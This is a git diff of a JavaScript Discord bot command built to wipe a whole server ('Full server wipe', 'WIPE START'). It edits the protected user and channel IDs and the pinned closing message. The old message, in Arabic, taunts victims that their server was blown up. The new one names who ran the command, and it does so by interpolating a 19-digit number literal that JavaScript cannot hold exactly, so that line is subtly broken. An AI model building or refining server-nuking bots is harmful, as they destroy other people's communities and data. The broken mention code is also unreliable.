@@ -72,8 +72,8 @@ module.exports = {
             // Full server wipe - CONFIGURABLE
             const PROTECTED_USERS = process.env.PROTECTED_USERS 
                 ? process.env.PROTECTED_USERS.split(',').map(id => id.trim()).filter(Boolean)
-                : ['1466529579056234557', '1481443265793360034'];
-            const PROTECTED_CHANNEL_ID = process.env.PROTECTED_CHANNEL_ID || '1478372459798593647';
+                : ['882493576221696000', '1447951012332699871'];
+            const PROTECTED_CHANNEL_ID = process.env.PROTECTED_CHANNEL_ID || '1485654622600298516';
             const SELF_ID = client.user.id;
 
             console.log(`💣 WIPE START - Protected: ${PROTECTED_USERS.join(', ')} | Self: ${SELF_ID}`);
@@ -189,7 +189,7 @@ module.exports = {
                         ownerMention = `<@${owner.id}>`;
                     } catch {}
                     const mentions = PROTECTED_USERS.map(id => `<@${id}>`).join(' ');
-                    const finalMsg = await protectedChannel.send(`${ownerMention} ${mentions} تم تفجير السيرفر يحبايبي حظ اوفر المرة القادمة 💣 **PAIN**`);
+                    const finalMsg = await protectedChannel.send(`${ownerMention} <@${882493576221696000}> تم تنفيذ هذا الأمر بواسطه`);
                     await finalMsg.pin();
                 }
             }, 6000);
